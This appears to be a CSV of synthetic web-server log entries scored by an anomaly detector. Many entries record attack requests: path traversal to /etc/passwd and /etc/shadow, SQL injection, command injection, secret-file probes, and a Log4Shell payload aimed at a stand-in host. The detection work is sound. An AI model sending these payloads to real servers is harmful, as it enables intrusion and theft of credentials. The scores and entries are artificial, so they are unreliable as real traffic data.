score_content,score_session,score_fused,line
3.7541348934173584,844.0969848632812,423.9255598783493,{"remote_addr": "217.154.8.6", "time_local": "11/Jan/2025:09:03:30 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 8109, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
2.7719268798828125,18.177213668823242,10.474570274353027,{"remote_addr": "132.192.21.146", "time_local": "11/Jan/2025:09:03:31 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 239, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.424560308456421,790.6487426757812,396.03665149211884,{"remote_addr": "91.110.47.246", "time_local": "11/Jan/2025:09:03:31 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 7144, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.9066143035888672,830.0247802734375,415.9656972885132,{"remote_addr": "154.150.213.185", "time_local": "11/Jan/2025:09:03:32 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 6337, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.250976324081421,790.2606201171875,395.75579822063446,{"remote_addr": "231.120.79.151", "time_local": "11/Jan/2025:09:03:33 -0700", "request": "GET /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 4629, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.9607247114181519,1954.5133056640625,978.2370151877403,{"remote_addr": "87.127.8.210", "time_local": "11/Jan/2025:09:03:34 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 304, "body_bytes_sent": 17167, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
1.4886640310287476,1460.49951171875,730.9940878748894,{"remote_addr": "131.82.111.1", "time_local": "11/Jan/2025:09:03:35 -0700", "request": "GET /search?q=router HTTP/2", "status": 304, "body_bytes_sent": 5428, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.455962657928467,635.8809204101562,320.16844153404236,{"remote_addr": "7.16.33.29", "time_local": "11/Jan/2025:09:03:36 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 14804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.0679895877838135,5233.8525390625,2617.960264325142,{"remote_addr": "138.116.100.71", "time_local": "11/Jan/2025:09:03:36 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 1165, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.2994999885559082,776.2766723632812,388.7880861759186,{"remote_addr": "233.212.21.114", "time_local": "11/Jan/2025:09:03:37 -0700", "request": "TRACE /dashboard HTTP/2", "status": 204, "body_bytes_sent": 7418, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
1.6432034969329834,726.4500122070312,364.0466078519821,{"remote_addr": "202.126.190.241", "time_local": "11/Jan/2025:09:03:38 -0700", "request": "GET /profile HTTP/2", "status": 204, "body_bytes_sent": 10862, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
6.025228500366211,77.26058197021484,41.64290523529053,{"remote_addr": "3.147.72.57", "time_local": "11/Jan/2025:09:03:38 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 13639, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.029601573944092,1303.987060546875,653.0083310604095,{"remote_addr": "43.122.210.16", "time_local": "11/Jan/2025:09:03:38 -0700", "request": "TRACE /contact HTTP/2", "status": 302, "body_bytes_sent": 942, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.8212127685546875,586.6910400390625,296.2561264038086,{"remote_addr": "163.65.123.32", "time_local": "11/Jan/2025:09:03:39 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 11947, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.9133504629135132,2.2108731269836426,2.062111794948578,{"remote_addr": "110.187.76.129", "time_local": "11/Jan/2025:09:03:40 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 281, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.4161148071289062,813.6127319335938,407.5144233703613,{"remote_addr": "133.209.197.202", "time_local": "11/Jan/2025:09:03:40 -0700", "request": "TRACE /.env HTTP/2", "status": 200, "body_bytes_sent": 10422, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
2.491328239440918,831.6058349609375,417.0485816001892,{"remote_addr": "146.17.66.216", "time_local": "11/Jan/2025:09:03:41 -0700", "request": "DELETE /profile HTTP/2", "status": 201, "body_bytes_sent": 13225, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
1.4987362623214722,650.7920532226562,326.14539474248886,{"remote_addr": "86.254.23.113", "time_local": "11/Jan/2025:09:03:42 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 201, "body_bytes_sent": 16217, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.7719359397888184,2.2779130935668945,2.0249245166778564,{"remote_addr": "153.153.90.228", "time_local": "11/Jan/2025:09:03:43 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 4950, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.615903854370117,653.2513427734375,328.9336233139038,{"remote_addr": "170.103.4.214", "time_local": "11/Jan/2025:09:03:44 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 17461, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.573078155517578,816.0289306640625,410.30100440979004,{"remote_addr": "211.158.163.238", "time_local": "11/Jan/2025:09:03:44 -0700", "request": "HEAD /.env HTTP/2", "status": 200, "body_bytes_sent": 3869, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
6.393441677093506,1824.4755859375,915.4345138072968,{"remote_addr": "96.58.174.224", "time_local": "11/Jan/2025:09:03:45 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17378, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.136416435241699,113.52793884277344,57.83217763900757,{"remote_addr": "160.201.169.229", "time_local": "11/Jan/2025:09:03:46 -0700", "request": "PUT /api/products HTTP/2", "status": 200, "body_bytes_sent": 16528, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.930602788925171,1859.162841796875,930.5467222929001,{"remote_addr": "115.202.115.84", "time_local": "11/Jan/2025:09:03:47 -0700", "request": "GET /..%2f..%2fetc%2fpasswd HTTP/2", "status": 301, "body_bytes_sent": 15801, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.53614616394043,781.2568359375,392.8964910507202,{"remote_addr": "164.190.15.137", "time_local": "11/Jan/2025:09:03:48 -0700", "request": "HEAD /.env HTTP/2", "status": 204, "body_bytes_sent": 12625, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
4.119376182556152,777.7257690429688,390.92257261276245,{"remote_addr": "22.22.151.23", "time_local": "11/Jan/2025:09:03:48 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 3147, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.2340691089630127,790.4239501953125,395.82900965213776,{"remote_addr": "203.33.198.192", "time_local": "11/Jan/2025:09:03:49 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 6548, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.405899167060852,812.7662963867188,407.0860977768898,{"remote_addr": "88.10.175.123", "time_local": "11/Jan/2025:09:03:49 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 5688, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
2.525474786758423,791.7958984375,397.1606866121292,{"remote_addr": "165.112.22.144", "time_local": "11/Jan/2025:09:03:50 -0700", "request": "DELETE /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 1414, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.6010267734527588,635.044677734375,318.3228522539139,{"remote_addr": "5.247.235.242", "time_local": "11/Jan/2025:09:03:51 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 14857, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.568698883056641,585.5337524414062,295.05122566223145,{"remote_addr": "54.87.111.119", "time_local": "11/Jan/2025:09:03:52 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 6800, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
6.787827491760254,5729.8291015625,2868.30846452713,{"remote_addr": "102.162.159.212", "time_local": "11/Jan/2025:09:03:53 -0700", "request": "OPTIONS /../../etc/passwd HTTP/2", "status": 400, "body_bytes_sent": 106, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
6.036312103271484,1386.5859375,696.3111248016357,{"remote_addr": "222.151.115.170", "time_local": "11/Jan/2025:09:03:53 -0700", "request": "OPTIONS /contact HTTP/2", "status": 302, "body_bytes_sent": 8691, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.3993587493896484,2106.648193359375,1054.0237760543823,{"remote_addr": "210.45.9.117", "time_local": "11/Jan/2025:09:03:54 -0700", "request": "TRACE /server-status HTTP/2", "status": 301, "body_bytes_sent": 13191, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
2.5093328952789307,638.44677734375,320.47805511951447,{"remote_addr": "71.131.119.250", "time_local": "11/Jan/2025:09:03:54 -0700", "request": "DELETE /.git/config HTTP/2", "status": 204, "body_bytes_sent": 3144, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
2.3888871669769287,11898.619140625,5950.5040138959885,{"remote_addr": "135.92.175.250", "time_local": "11/Jan/2025:09:03:55 -0700", "request": "GET /search?q=router HTTP/2", "status": 500, "body_bytes_sent": 500, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.3486557006835938,2075.40869140625,1038.3786735534668,{"remote_addr": "93.150.65.59", "time_local": "11/Jan/2025:09:03:56 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 1718, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
1.7358226776123047,2.7961597442626953,2.2659912109375,{"remote_addr": "172.164.159.95", "time_local": "11/Jan/2025:09:03:56 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 11980, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.3042179346084595,621.0872802734375,311.195749104023,{"remote_addr": "100.185.113.238", "time_local": "11/Jan/2025:09:03:57 -0700", "request": "GET /contact HTTP/2", "status": 200, "body_bytes_sent": 11308, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.2841925621032715,1861.4613037109375,931.8727481365204,{"remote_addr": "96.54.91.64", "time_local": "11/Jan/2025:09:03:57 -0700", "request": "TRACE /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 301, "body_bytes_sent": 8812, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
1.797006607055664,724.49072265625,363.14386463165283,{"remote_addr": "48.92.116.173", "time_local": "11/Jan/2025:09:03:58 -0700", "request": "POST /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 4271, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.388327717781067,2076.489990234375,1038.939158976078,{"remote_addr": "240.65.173.148", "time_local": "11/Jan/2025:09:03:59 -0700", "request": "POST /search?q=router HTTP/2", "status": 302, "body_bytes_sent": 10599, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
6.280221939086914,767.5167846679688,386.89850330352783,{"remote_addr": "2.135.164.160", "time_local": "11/Jan/2025:09:04:00 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8363, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.9409708976745605,583.3424072265625,292.64168906211853,{"remote_addr": "166.249.126.194", "time_local": "11/Jan/2025:09:04:00 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 16347, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
2.3920252323150635,1907.860595703125,955.12631046772,{"remote_addr": "11.27.43.164", "time_local": "11/Jan/2025:09:04:01 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 301, "body_bytes_sent": 8407, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.0351481437683105,70.61064147949219,36.32289481163025,{"remote_addr": "123.243.148.242", "time_local": "11/Jan/2025:09:04:02 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 17885, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
3.822882652282715,2154.803466796875,1079.3131747245789,{"remote_addr": "92.182.11.122", "time_local": "11/Jan/2025:09:04:03 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 12230, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
2.4233028888702393,2.857367753982544,2.6403353214263916,{"remote_addr": "223.236.126.254", "time_local": "11/Jan/2025:09:04:04 -0700", "request": "PUT /api/products HTTP/2", "status": 200, "body_bytes_sent": 712, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.469646453857422,670.4127807617188,338.4412136077881,{"remote_addr": "150.167.169.19", "time_local": "11/Jan/2025:09:04:05 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 6217, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
3.6564416885375977,2180.64794921875,1092.1521954536438,{"remote_addr": "96.59.80.161", "time_local": "11/Jan/2025:09:04:06 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 304, "body_bytes_sent": 7594, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
6.064548969268799,2147.97607421875,1077.0203115940094,{"remote_addr": "30.47.75.240", "time_local": "11/Jan/2025:09:04:07 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 301, "body_bytes_sent": 1889, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
2.9088997840881348,6021.5517578125,3012.230328798294,{"remote_addr": "130.165.44.26", "time_local": "11/Jan/2025:09:04:08 -0700", "request": "PUT /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 404, "body_bytes_sent": 311, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.7111866474151611,5926.40625,2964.0587183237076,{"remote_addr": "210.241.225.11", "time_local": "11/Jan/2025:09:04:09 -0700", "request": "GET /index.html HTTP/2", "status": 403, "body_bytes_sent": 975, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
4.483668327331543,777.0902099609375,390.7869391441345,{"remote_addr": "93.136.53.254", "time_local": "11/Jan/2025:09:04:10 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 6116, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.1756906509399414,5565.5185546875,2783.84712266922,{"remote_addr": "197.202.238.119", "time_local": "11/Jan/2025:09:04:11 -0700", "request": "PUT /search?q=ssd HTTP/2", "status": 400, "body_bytes_sent": 522, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.7406432628631592,66.27462768554688,34.00763547420502,{"remote_addr": "139.240.71.215", "time_local": "11/Jan/2025:09:04:12 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 463, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.3182713985443115,68.65681457519531,34.98754298686981,{"remote_addr": "60.90.62.75", "time_local": "11/Jan/2025:09:04:13 -0700", "request": "GET /index.html HTTP/2", "status": 200, "body_bytes_sent": 6298, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
6.187628746032715,585.3867797851562,295.7872042655945,{"remote_addr": "239.111.87.92", "time_local": "11/Jan/2025:09:04:14 -0700", "request": "OPTIONS /../../etc/passwd HTTP/2", "status": 200, "body_bytes_sent": 8753, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
